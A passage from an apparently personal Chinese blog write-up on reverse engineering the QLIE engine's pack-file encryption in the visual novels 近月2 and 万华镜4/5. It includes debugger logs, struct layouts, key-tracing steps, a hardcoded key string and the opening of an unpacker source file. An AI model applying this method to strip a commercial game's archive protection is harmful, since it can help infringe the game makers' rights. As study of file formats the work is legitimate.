class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">读取文件:  句柄:364 缓冲:19F642 字节数:2</span><br><span class="line">断点已设置在 004E4CB8 ！</span><br><span class="line">INT3 断点于 月に寄りそう乙女の作法2.2.004E4CB8 (004E4CB8)!</span><br><span class="line">读取文件:  句柄:364 缓冲:2981650 字节数:48</span><br><span class="line">读取文件:  句柄:364 缓冲:28D6118 字节数:1C</span><br><span class="line">INT3 断点于 月に寄りそう乙女の作法2.2.004EDA9A (004EDA9A)!</span><br><span class="line">读取文件:  句柄:364 缓冲:19F642 字节数:2</span><br><span class="line">读取文件:  句柄:364 缓冲:29AFDC8 字节数:12</span><br><span class="line">读取文件:  句柄:364 缓冲:28D6134 字节数:1C</span><br><span class="line">INT3 断点于 月に寄りそう乙女の作法2.2.004EDA9A (004EDA9A)!</span><br><span class="line">读取文件:  句柄:364 缓冲:19F642 字节数:2</span><br><span class="line">读取文件:  句柄:364 缓冲:29CB858 字节数:18</span><br><span class="line">读取文件:  句柄:364 缓冲:28D6150 字节数:1C</span><br><span class="line">INT3 断点于 月に寄りそう乙女の作法2.2.004EDA9A (004EDA9A)!</span><br><span class="line">读取文件:  句柄:364 缓冲:19F642 字节数:2</span><br><span class="line">读取文件:  句柄:364 缓冲:299F590 字节数:2C</span><br><span class="line">读取文件:  句柄:364 缓冲:28D616C 字节数:1C</span><br><span class="line">INT3 断点于 月に寄りそう乙女の作法2.2.004EDA9A (004EDA9A)!</span><br><span class="line">读取文件:  句柄:364 缓冲:19F642 字节数:2</span><br><span class="line">读取文件:  句柄:364 缓冲:299F590 字节数:26</span><br><span class="line">读取文件:  句柄:364 缓冲:28D6188 字节数:1C</span><br><span class="line">INT3 断点于 月に寄りそう乙女の作法2.2.004EDA9A (004EDA9A)!</span><br><span class="line">读取文件:  句柄:364 缓冲:19F642 字节数:2</span><br><span class="line">读取文件:  句柄:364 缓冲:299F590 字节数:28</span><br><span class="line">读取文件:  句柄:364 缓冲:28D61A4 字节数:1C</span><br><span class="line">INT3 断点于 月に寄りそう乙女の作法2.2.004EDA9A (004EDA9A)!</span><br><span class="line">读取文件:  句柄:364 缓冲:19F642 字节数:2</span><br><span class="line">读取文件:  句柄:364 缓冲:29B4D58 字节数:30</span><br><span class="line">读取文件:  句柄:364 缓冲:28D61C0 字节数:1C</span><br><span class="line">INT3 断点于 月に寄りそう乙女の作法2.2.004EDA9A (004EDA9A)!</span><br><span class="line">读取文件:  句柄:364 缓冲:19F642 字节数:2</span><br><span class="line">读取文件:  句柄:364 缓冲:29B4D58 字节数:30</span><br><span class="line">读取文件:  句柄:364 缓冲:28D61DC 字节数:1C</span><br><span class="line">INT3 断点于 月に寄りそう乙女の作法2.2.004EDA9A (004EDA9A)!</span><br><span class="line">读取文件:  句柄:364 缓冲:19F642 字节数:2</span><br><span class="line">读取文件:  句柄:364 缓冲:29BBE28 字节数:36</span><br><span class="line">读取文件:  句柄:364 缓冲:28D61F8 字节数:1C</span><br><span class="line">INT3 断点于 月に寄りそう乙女の作法2.2.004EDA9A (004EDA9A)!</span><br><span class="line">读取文件:  句柄:364 缓冲:19F642 字节数:2</span><br><span class="line">读取文件:  句柄:364 缓冲:29BBE28 字节数:36</span><br><span class="line">读取文件:  句柄:364 缓冲:28D6214 字节数:1C</span><br><span class="line">INT3 断点于 月に寄りそう乙女の作法2.2.004EDA9A (004EDA9A)!</span><br><span class="line">读取文件:  句柄:364 缓冲:19F642 字节数:2</span><br><span class="line">读取文件:  句柄:364 缓冲:29B4D58 字节数:34</span><br><span class="line">读取文件:  句柄:364 缓冲:28D6230 字节数:1C</span><br><span class="line">INT3 断点于 月に寄りそう乙女の作法2.2.004EDA9A (004EDA9A)!</span><br><span class="line">读取文件:  句柄:364 缓冲:19F642 字节数:2</span><br><span class="line">读取文件:  句柄:364 缓冲:29B4D58 字节数:34</span><br><span class="line">读取文件:  句柄:364 缓冲:28D624C 字节数:1C</span><br><span class="line">INT3 断点于 月に寄りそう乙女の作法2.2.004EDA9A (004EDA9A)!</span><br><span class="line">读取文件:  句柄:364 缓冲:19F642 字节数:2</span><br><span class="line">读取文件:  句柄:364 缓冲:29BBF48 字节数:38</span><br><span class="line">读取文件:  句柄:364 缓冲:28D6268 字节数:1C</span><br><span class="line">INT3 断点于 月に寄りそう乙女の作法2.2.004EDA9A (004EDA9A)!</span><br><span class="line">读取文件:  句柄:364 缓冲:19F642 字节数:2</span><br><span class="line">读取文件:  句柄:364 缓冲:297A038 字节数:52</span><br><span class="line">读取文件:  句柄:364 缓冲:28D6284 字节数:1C</span><br><span class="line">INT3 断点于 月に寄りそう乙女の作法2.2.004EDA9A (004EDA9A)!</span><br><span class="line">读取文件:  句柄:364 缓冲:19F642 字节数:2</span><br><span class="line">读取文件:  句柄:364 缓冲:28CBDD0 字节数:56</span><br><span class="line">读取文件:  句柄:364 缓冲:28D62A0 字节数:1C</span><br><span class="line">INT3 断点于 月に寄りそう乙女の作法2.2.004EDA9A (004EDA9A)!</span><br><span class="line">读取文件:  句柄:364 缓冲:19F642 字节数:2</span><br><span class="line">读取文件:  句柄:364 缓冲:297A038 字节数:54</span><br><span class="line">读取文件:  句柄:364 缓冲:28D62BC 字节数:1C</span><br><span class="line">INT3 断点于 月に寄りそう乙女の作法2.2.004EDA9A (004EDA9A)!</span><br><span class="line">读取文件:  句柄:364 缓冲:19F642 字节数:2</span><br><span class="line">读取文件:  句柄:364 缓冲:28CBEA0 字节数:56</span><br><span class="line">读取文件:  句柄:364 缓冲:28D62D8 字节数:1C</span><br><span class="line">INT3 断点于 月に寄りそう乙女の作法2.2.004EDA9A (004EDA9A)!</span><br><span class="line">读取文件:  句柄:364 缓冲:19F642 字节数:2</span><br><span class="line">读取文件:  句柄:364 缓冲:29B4D58 字节数:34</span><br><span class="line">读取文件:  句柄:364 缓冲:28D62F4 字节数:1C</span><br></pre></td></tr></table></figure><p>然后来分析这些读取的究竟是些什么数据<br>看都是固定长度1C的数据 多分析几组<br><code>00 00 00 00 00 00 00 00 23 10 00 00 23 10 00 00 00 00 00 00 01 00 00 00 12 40 63 EB</code><br><code>23 10 00 00 00 00 00 00 57 02 00 00 F6 06 00 00 01 00 00 00 01 00 00 00 23 F2 E4 E4</code><br><code>7A 12 00 00 00 00 00 00 64 03 00 00 64 12 00 00 01 00 00 00 01 00 00 00 BC 0C 7A ED</code><br><code>DE 15 00 00 00 00 00 00 1C 12 00 00 1C 12 00 00 00 00 00 00 01 00 00 00 0C E4 5E FF</code><br>…<br><code>0C 4F 00 00 00 00 00 00 A5 0A 00 00 A5 0A 00 00 00 00 00 00 01 00 00 00 EA C6 DC F9</code></p><p>由日志可以看出1C这组地址是连续的 很像一个结构体数组<br>由第一二组 &#x3D;&gt; 00 00 00 00 + 23 10 00 00 &#x3D; 23 10 00 00<br>大致能确定前两个DWORD组成一个QWORD(结合前面的经验)代表地址 然后第三个DWORD代表size(相邻地址的间隔)<br>然后发现一个很有趣的点 观察第四个和第五个DWORD<br>从第五个DWORD入手 当其为0的时候 发现第三个DWORD的size和第四个DWORD的值一样<br>而为1的时候 第四个比第三个大<br>由于这是在FilePack的文件读取初始化中 且我们以及解密了文件名 那么现在解的就是文件本体了<br>可以推断第五个DWORD是标志位 代表大小是否改变 那么第四个DWORD就应该是解密后的size了  至于最后一个DWORD完全看不出来 可能是CRC校验之类的<br>由于这个结构体的功能是 索引地址+提供解密所需的标志参数 将其命名为FileEntry(还是取一样的)<br>结构如下:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">FileEntry</span>&#123;</span><br><span class="line">    QWORD offset; <span class="comment">// DWORD2:DWORD1</span></span><br><span class="line">    DWORD size;</span><br><span class="line">    DWORD decrypted_size; <span class="comment">// 解密后的size</span></span><br><span class="line">    DWORD isCompressed; <span class="comment">// 0/1 标志位</span></span><br><span class="line">    DWORD unk1; <span class="comment">// all_the_same : 1</span></span><br><span class="line">    DWORD unk2; <span class="comment">// maybe hash/CRC</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="文件解密"><a href="#文件解密" class="headerlink" title="文件解密"></a>文件解密</h3><p>然后要等所有文件的文件名都解完过后才进入文件解密<br>前面的流程大致是把每个datax.pack的文件名都解密了 然后都读取了FileEntry<br>结束后日志发现有个 <code>读取文件:  句柄:360 缓冲:3CED440 字节数:1023</code><br>关键的解密函数在sub_4ED454 但找不到是怎么进到这个函数的…<br>IDA看大致结构:<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-27.png" alt="img"><br>根据传入的参数来选择不同分支<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-28.png" alt="img"><br>进入decrypt3后又有个分支<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-29.png" alt="img"><br>但其实IDA看一模一样… 只是写法有一点差异 实现功能完全相同</p><p>近月2所有都是decrypt3 从前面分析的<code>FileEntry</code>结构体可知<br>IDA看<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-30.png" alt="img"><br>由前面的经验知道<code>sub_4ECE7C(a1);</code>就是算出一个hash供后面作为key解密<br>进入hash函数<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-31.png" alt="img"></p><p>先是用 “pack_keyfile_kfueheish15538fa9or.key”对两个key又做了加密<br>然后进入sub_4ECE40算HASH<br>这里的传参要仔细动调<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-32.png" alt="img"><br>而另一个调一调发现是前面传入的1023 也就是读取文件的size<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-33.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-34.png" alt="img"></p><p>XMM指令集开个自动注释就都能弄懂 <code>_m_pslldi</code>是DWORD逻辑左移<br>然后动调看看哪个值指向hash[]<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-35.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-36.png" alt="img"></p><p>到此 近月2的文件解密已经告一段落了<br>近月2都用的decrypt3 而 万华镜用的都是decrypt4</p><p>总流程:<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/flow.png" alt="img"></p><h1 id="万华镜5"><a href="#万华镜5" class="headerlink" title="万华镜5"></a>万华镜5</h1><p>经过前面近月2的逆向 对qlie引擎有了一定的了解<br>万华镜5和近月2最大的不同就在于前者采用的是decrypt4</p><p>wtm谢谢你… 伟大的汉化组汉化完加了个壳…<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-37.png" alt="img"></p><p>先看看万华镜4 感觉逻辑应该差不了太多<br>第一个难点 如何定位到decrypt4的地方?<br>当然可以再跟着近月2的步骤调试一遍<br>但有个更好用的方法:<br>我们知道这两款游戏的引擎是一样的 所以基本特征肯定是相同的<br>我们复制近月2的decrypt3附近的字节码<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-38.png" alt="img"><br>然后在x32dbg的内存布局里搜索匹配特征<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-39.png" alt="img"><br>嗖的一下 就搜到了~<br>成功定位<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-40.png" alt="img"></p><p>很离谱的是为什么万华镜4大部分都是decrypt3啊…<br>终于断到decrypt4过后就可以开始逆了~<br>将近月2的decrypt3和镜的decrypt4对比着看很容易看出区别</p><h2 id="decrypt4"><a href="#decrypt4" class="headerlink" title="decrypt4"></a>decrypt4</h2><p>开始分析<br>进入后跟decrypt3一样 也有两个分支 但是都是大同小异 功能完全一样<br>而且对比近月2和镜4发现decrypt4函数也一模一样<br>所有关键参数甚至连变量命名都一样 所以可以放心逆镜4的decrypt4</p><p>IDA大致对比一下dec3和dec4<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-41.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-42.png" alt="img"></p><p>首先是hash函数实现不同 然后就是dec4多了一个hash表&#x2F;key表 用的双表加密而非3的单表加密</p><p>但hash函数也只是改了些加密常量而已 具体算法都没变</p><p>接下来关注那个多出来的表<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-43.png" alt="img"><br>确实有另一个table在 总长度为0x400 bytes<br>很巧的是教程用镜5 不同的文件调用decrypt4时的table长度是一样的 内容不一样<br>那就很自然想知道这个table或者key数组在哪里被怎么算出来的?</p><h3 id="回溯找key"><a href="#回溯找key" class="headerlink" title="回溯找key[]"></a>回溯找<code>key[]</code></h3><p>教程教了一个很棒的方法 用强大的CheatEngine来搜索这个key数组<br>搜索选项调成搜索<code>字节数组</code><br>就搜索开头的几个DWORD<br><code>48 BA EC 20 08 60 BB 96 6E 12 88 8E D7 5B 2F 35 02 5F DA D7 11 9A 9F B7 03 6C 7D CA E3 FE 3F 07</code><br>发现已经可数了<br>扫镜4:<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-45.png" alt="img"><br>接下来就是逐步往前回溯了 去找在哪个调用点的时候刚好算出了key<br>还想着看能不能通过IDA的立即数搜索缩小一下范围 发现0x400出现的太多 还是老老实实看交叉引用吧…</p><p>往上回溯到进入调用dec3,4的函数 断在dec3发现已经算出key了…<br>跟之前猜测有误 说明这个key也许是固定的?<br>继续往上回溯<br>发现有两个可能 下断点标记一下 发现在第二个进入的<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-46.png" alt="img"></p><p>从<code>sub_4E966C</code>再往上回溯<br>下断点动调&lt;- <code>sub_4E9800</code><br>&lt;-<code>sub_4EA4B4</code> 还有key[]…<br>&lt;-<code>sub4EC5AC</code><br>再回溯就有很多分支了…<br>直接一键在所有分支设断点 发现断在一个比较奇怪的地址<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-47.png" alt="img"><br>地址是6开头 不是用户区的4也不是系统区的7 而是引擎的代码?<br>来到了<code>sub_6DD224</code>函数<br>&lt;-<code>sub_6DD9B8</code><br>发现在这个开头的时候就没有key了!!!<br>!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-48.png" alt="img"><br>没多少了 慢慢排除<br>挨个if下断点CE来找<br>得到结论:<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-49.png" alt="img"><br>就是在sub_4EC10C里面的do-while来算的key<br>但4这里面看起来完全不像是在计算key的啊…<br>采取一步一段然后CE查的方法 定位到这里<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-50.png" alt="img"><br>发现貌似引用了data0.hash这种<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-51.png" alt="img"><br>这就尴尬了…<br>在想是不是4和5的区别???<br>…服了…<br>也就是5之前的镜是用前面文件解密得到的datax.hash来计算???或是直接copy过来???<br>后续代码编写后运行也发现确实有较大区别<br>先还是按照镜5的代码来写<br>当然逆向的基本流程已经全部实操过了 等找到镜5的无壳版本再找一遍key的生成函数</p><h3 id="镜5回溯找-key"><a href="#镜5回溯找-key" class="headerlink" title="镜5回溯找 key[]"></a>镜5回溯找 <code>key[]</code></h3><p>终于找到无壳的版本了~<br>再回溯找一遍key<br>有了镜4找dec4和key的经验 很快能定位到这里<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-52.png" alt="img"><br>然后就慢慢地CE回溯吧<br>跟到这里发现已经有PACK&#x2F;key字样了<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-53.png" alt="img"><br>再往前可以追到<code>710E8D</code> 这是引擎代码的区域<br>最后定位到这个分界点<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-54.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-55.png" alt="img"><br>最终确定<img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-56.png" alt="img"><br>确定到某个具体的call后 里面还有很多看似没有计算key的 采取逐个下断 缩小范围<br>(发现跟镜4貌似是一样的… 看来还是没跟踪到每一个call…)<br>进一步缩小到这里 <img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-57.png" alt="img"><br>Finally 终于定位到了<img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-58.png" alt="img"><br>IDA看<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-59.png" alt="img"><br>动调跟踪看间接调用<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-60.png" alt="img"><br>table就存在<code>[ebp]</code>中<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91/images/image-61.png" alt="img"></p><p>🎉🎉🎉</p><h1 id="解密代码"><a href="#解密代码" class="headerlink" title="解密代码"></a>解密代码</h1><p>到了最后的环节了 根据前面得到的所有信息来编写镜5的解包程序</p><p>自己尝试写到decrypt3_hash 后面是在写不动了… 也不是很想再开x32dbg去找对应offset了 再加上没有镜5也不好找decrypt4_hash<br>在佬的源代码上做了些修改 加了一些自己的理解 希望有朝一日能够独立写出这样的代码 把万华镜4类似的独立解包吧~</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;mmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QWORD unsigned __int64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __PAIR64__(high, low)   (((QWORD) (high) &lt;&lt; 32) | (DWORD)(low))</span></span><br><span class="line"><span 